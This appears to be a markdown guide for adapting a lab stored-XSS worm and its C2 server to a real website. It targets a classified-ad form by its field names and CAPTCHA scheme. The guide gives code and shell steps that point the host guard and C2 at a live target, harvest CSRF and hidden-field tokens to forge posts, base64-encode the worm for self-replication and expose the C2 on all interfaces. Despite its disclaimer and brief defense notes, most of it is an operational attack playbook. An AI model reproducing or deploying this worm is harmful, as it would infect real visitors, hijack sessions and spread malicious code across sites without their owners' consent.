# DEPLOY ON REAL TARGET — Instructions for Adapting Lab Payloads

> ## ⚠️ DISCLAIMER — READ BEFORE PROCEEDING
> This file is **laboratory research material** intended for an
> isolated environment or authorized penetration testing only. It is
> **not a tool for attacking real websites without permission**.
>
> The instructions below describe how to adapt the lab payloads to a
> **specific target website**. Until these changes are made, the lab
> payloads are inert and will **not run** on the real target.
>
> Use this only on systems **you own** or for which you have the
> owner's **written authorization** (e.g., an in-scope bug bounty or
> contract). Attacking systems without authorization is illegal.
>
> See `DISCLAIMER.md` for ethical and legal boundaries.

---

## Overview

The lab repository (`payload_lab.txt`, `worm_lab.txt`) is guarded to run
only on `lab.local` and send data to `127.0.0.1:8080`. To deploy on a
real target, you must:

1. Change the **host guard** from `lab.local` to the target domain.
2. Change the **C2 address** from `127.0.0.1:8080` to your external C2.
3. Change the **replication target** (`T`) to the target website URLs.
4. Match the **form field names** and **submission flow** to the target site.
5. Adjust the **C2 server** (`c2.py`) to bind externally and use a real token.

The following sections list the exact changes required.

---

## 1. Target Website Details (Fill in for your target)

| Parameter | Value (example) |
|---|---|
| Domain | `example.com` |
| IP | `X.X.X.X` |
| Form page | `/novy-inzerat.php` (new ad submission) |
| Ad display | `/inzerat/{id}` or similar (where stored content is rendered) |
| Form fields | `jmeno` (name), `TextArea` (ad text), `kod` (CAPTCHA sum), `button` (submit) |
| CAPTCHA | 4 digits, answer = sum of first two digits |
| Session | PHP session (`PHPSESSID` cookie) |

**Vulnerability**: Stored XSS in the ad text field — content is rendered
without proper escaping in some views, allowing inline JavaScript execution.

---

## 2. Payload Changes (`payload_lab.txt`)

### Current (lab-only)

```javascript
if(location.host.indexOf("lab.local")<0)return;
var C="http://127.0.0.1:8080";
```

### Required changes for real target

```javascript
// Change host guard to target domain
if(location.host.indexOf("example.com")<0)return;

// Change C2 to external server
var C="http://<YOUR_C2_IP>:8080";
```

**Where to edit**: In `payload_lab.txt`, find the `<img src=x onerror="...">`
line and replace:
- `"lab.local"` → `"<TARGET_DOMAIN>"`
- `"http://127.0.0.1:8080"` → `"http://<YOUR_C2_IP>:8080"`

---

## 3. Worm/Replication Changes (`worm_lab.txt`)

### Current (lab-only)

```javascript
var C="http://127.0.0.1:8080",T="http://lab.local";
if(location.host.indexOf("lab.local")<0)return;
// ...
x1.open("GET",T+"/index.php",true);
x2.open("GET",T+"/captcha.php?t="+Date.now(),true);
// ...
f.append("jmeno","LabTester");
f.append("TextArea",t);
f.append("kod",kod);
f.append("button","Odeslat");
x.open("POST",T+"/index.php",true);
// ...
var P="TEFCUEFZTE9BREI2NA==";
```

### Required changes for real target

```javascript
// Change host guard and target base
var C="http://<YOUR_C2_IP>:8080",T="http://example.com";
if(location.host.indexOf("example.com")<0)return;

// Change form page URL (adjust to target)
x1.open("GET",T+"/novy-inzerat.php",true);

// CAPTCHA endpoint (adjust if different)
x2.open("GET",T+"/captcha.php?t="+Date.now(),true);

// Form submission URL
x.open("POST",T+"/novy-inzerat.php",true);

// Optional: change test name
f.append("jmeno","AdTester");

// Enable self-replication: replace P with base64-encoded payload
// See "FULL SELF-REPLICATION ACTIVATION" in worm_lab.txt
```

**Where to edit**: In `worm_lab.txt`, find the payload line and make the
replacements above.

---

## 4. C2 Server Changes (`c2.py`)

### Current (lab-only)

```python
C2_BIND = os.getenv("C2_BIND", "127.0.0.1")
C2_PORT = int(os.getenv("C2_PORT", "8080"))
C2_TOKEN = os.getenv("C2_TOKEN", "LABTOKEN")
```

### Required changes for real target

```bash
# Run C2 on external interface
C2_BIND="0.0.0.0" C2_PORT="8080" C2_TOKEN="<STRONG_TOKEN>" python3 c2.py
```

Or edit `c2.py` directly:
```python
C2_BIND = os.getenv("C2_BIND", "0.0.0.0")  # Listen on all interfaces
C2_TOKEN = os.getenv("C2_TOKEN", "<STRONG_TOKEN>")  # Set a strong token
```

**Important**:
- Use a strong, random token (e.g., `openssl rand -hex 32`).
- Consider adding firewall rules to limit access to your IP.
- The `/solve` OCR endpoint has rate limiting (30 requests per 60 seconds).

---

## 5. CSRF Token and Hidden Field Handling

Many modern forms include a **CSRF token** as a hidden input field. If the
form has such a field, the payload **must include it** in the POST request,
or the submission will be rejected.

### 5.1 Detecting CSRF Tokens

1. Open the form page in browser devtools (F12).
2. Inspect the `<form>` element and look for hidden inputs:
   ```html
   <input type="hidden" name="csrf_token" value="abc123...">
   <input type="hidden" name="_token" value="xyz789...">
   <input type="hidden" name="token" value="...">
   ```
3. Common CSRF field names:
   - `csrf_token`, `csrf`, `_csrf`, `csrf_token`
   - `_token`, `token`, `xsrf_token`
   - `__RequestVerificationToken` (ASP.NET)
   - `authenticity_token` (Rails)

### 5.2 Extracting and Including CSRF Token in Payload

If the target uses a CSRF token, you must **dynamically extract it** from the
form page and include it in the POST request.

**Modified payload code** (add before the `post()` function):

```javascript
// Extract CSRF token from the page
function getCsrfToken() {
    var inputs = document.querySelectorAll('input[type="hidden"]');
    for (var i = 0; i < inputs.length; i++) {
        var name = inputs[i].name.toLowerCase();
        if (name.indexOf('csrf') >= 0 || name === '_token' || name === 'token') {
            return { name: inputs[i].name, value: inputs[i].value };
        }
    }
    return null;
}

// Modified post() function to include CSRF token
function post(kod) {
    var P="TEFCUEFZTE9BREI2NA==", t;
    try { t=atob(P) } catch(e) { t=P }
    
    var f = new FormData();
    f.append("jmeno", "AdTester");
    f.append("TextArea", t);
    
    // Include CSRF token if present
    var csrf = getCsrfToken();
    if (csrf) {
        f.append(csrf.name, csrf.value);
    }
    
    if (kod !== undefined) f.append("kod", kod);
    f.append("button", "Odeslat");
    
    var x = new XMLHttpRequest();
    x.open("POST", T + "/novy-inzerat.php", true);
    x.send(f);
}
```

### 5.3 Alternative: Capture Token During Form Page Load

If the CSRF token is loaded dynamically (via AJAX) or embedded in a meta tag:

```javascript
// Extract from meta tag
function getCsrfFromMeta() {
    var meta = document.querySelector('meta[name="csrf-token"]');
    if (meta) return meta.getAttribute('content');
    return null;
}

// Or from a data attribute on the form
function getCsrfFromForm() {
    var form = document.querySelector('form');
    if (form && form.dataset.csrf) return form.dataset.csrf;
    return null;
}
```

### 5.4 Hidden Fields Beyond CSRF

Some forms include other hidden fields that must be preserved:

- **Form identifiers**: `form_id`, `action`, `step`
- **Session tracking**: `session_id`, `view_state`
- **Anti-automation**: `timestamp`, `nonce`

**Generic handler** (include all hidden fields):

```javascript
function post(kod) {
    var P="TEFCUEFZTE9BREI2NA==", t;
    try { t=atob(P) } catch(e) { t=P }
    
    var f = new FormData();
    
    // Include all hidden fields from the form
    var form = document.querySelector('form');
    if (form) {
        var hidden = form.querySelectorAll('input[type="hidden"]');
        for (var i = 0; i < hidden.length; i++) {
            f.append(hidden[i].name, hidden[i].value);
        }
    }
    
    f.append("jmeno", "AdTester");
    f.append("TextArea", t);
    if (kod !== undefined) f.append("kod", kod);
    f.append("button", "Odeslat");
    
    var x = new XMLHttpRequest();
    x.open("POST", T + "/novy-inzerat.php", true);
    x.send(f);
}
```

### 5.5 Verification

After adding CSRF handling:

1. Test in the lab with a form that has a hidden field.
2. Verify the POST request includes all required hidden fields.
3. Check browser devtools Network tab for the submission.
4. Confirm the form accepts the submission (no CSRF error).

**Example inspection**:
```html
<form method="post" action="/novy-inzerat.php">
  <input type="hidden" name="csrf_token" value="abc123xyz">
  <input name="jmeno" placeholder="Name">
  <textarea name="TextArea"></textarea>
  <img src="/captcha.php">
  <input name="kod" placeholder="CAPTCHA">
  <button name="button" value="Odeslat">Submit</button>
</form>
```

If the target uses different field names or CSRF mechanisms, update the
payload accordingly.

---

## 6. CAPTCHA OCR Considerations

The lab OCR (`/solve` endpoint) achieves ~70–85% accuracy on the lab CAPTCHA
style. For a real target:

- **If the CAPTCHA is similar** (4 digits, sum of first two): The lab OCR
  should work with similar accuracy.
- **If the CAPTCHA is different**: You may need to adjust the OCR pipeline
  in `c2.py` (column segmentation, PSM modes, height parameters).
- **Rate limiting**: The `/solve` endpoint allows 30 requests per 60 seconds.
  Adjust `RATE_LIMIT_MAX` and `RATE_LIMIT_WINDOW` in `c2.py` if needed.

---

## 7. Self-Replication Activation

To enable the worm to replicate itself:

1. Extract the payload from `worm_lab.txt`:
   ```bash
   PAYLOAD=$(sed -n '/^<img src=x onerror=/p' worm_lab.txt)
   ```

2. Base64-encode it:
   ```bash
   NEW_B64=$(echo -n "$PAYLOAD" | base64 -w0)
   ```

3. Replace `P="TEFCUEFZTE9BREI2NA=="` in the payload with:
   ```javascript
   P="<NEW_B64>"
   ```

4. Re-test in the lab before deploying to the target.

**Warning**: Once enabled, each infected session will attempt to replicate
when it receives the `SPREAD` command from C2.

---

## 8. Testing Checklist

Before deploying to the real target:

- [ ] Host guard changed from `lab.local` to target domain
- [ ] C2 address changed to external IP
- [ ] Form URLs updated to target paths
- [ ] Form field names verified and updated
- [ ] C2 server binds to `0.0.0.0` (external)
- [ ] Strong token set for C2
- [ ] Firewall rules configured (optional but recommended)
- [ ] Self-replication enabled (if desired)
- [ ] Tested in lab environment first

---

## 9. Cleanup After Testing

After your penetration test:

1. Remove the injected payloads from the database.
2. Stop the C2 server.
3. Restore the lab payloads (change `lab.local` back).
4. Document findings and provide remediation recommendations.

---

## 10. Defense Recommendations

See `DEFENSE.md` for detailed defense measures:

- **CSP without `unsafe-inline`** — blocks inline handlers
- **Output escaping** — prevents stored XSS
- **HttpOnly/Secure/SameSite cookies** — protects sessions
- **Rate limits + stronger CAPTCHA** — reduces automation
- **Detection** — monitor for payload patterns and outbound requests

---

## Summary of Changes

| File | Change |
|---|---|
| `payload_lab.txt` | Host guard, C2 address |
| `worm_lab.txt` | Host guard, C2 address, target URLs, form fields, enable replication |
| `c2.py` | Bind to `0.0.0.0`, set strong token |
| Target site | Inject payload via vulnerable form field |

**Remember**: These changes make the payload **active** on the target. Test
in the lab first and document all changes.
